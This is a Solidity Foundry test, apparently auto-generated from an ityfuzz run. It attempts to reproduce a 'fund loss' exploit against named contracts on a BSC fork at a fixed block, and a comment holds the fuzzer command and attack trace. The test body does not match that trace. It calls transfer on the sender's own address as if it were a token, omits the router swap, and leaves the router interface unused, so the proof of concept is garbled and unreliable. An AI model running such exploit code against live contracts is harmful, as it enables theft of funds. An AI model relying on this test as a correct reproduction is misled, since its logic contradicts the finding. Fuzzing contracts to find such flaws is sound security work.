// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x68Cc90351a79A4c10078FE021bE430b7a12aaA09,0x88503F48e437a377f1aC2892cBB3a5b09949faDd,0xc342774492b54ce5F8ac662113ED702Fc1b34972 -c bsc --onchain-block-number 22315679 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 0.000 ETH by interacting with the provided contracts

================ Trace ================
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   ├─[1] Router.swapExactETHForTokens{value: 281478801948569}(0, path:(WETH → 0xc342774492b54ce5F8ac662113ED702Fc1b34972), address(this), block.timestamp);
   ├─[1] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.call(abi.encodeWithSelector(0x2e1a7d4d, 0))
   │  ├─[2] [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd.fallback()
   │  │  └─[3] 0xc342774492b54ce5F8ac662113ED702Fc1b34972.call(0x00000000)


 */

contract C68Cc is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315679);
    }

    function test() public {
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        IERC20(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd).transfer(0xc342774492b54ce5F8ac662113ED702Fc1b34972, 281478801948569);
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c.call(abi.encodeWithSelector(
            0x2e1a7d4d, 0
        ));
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
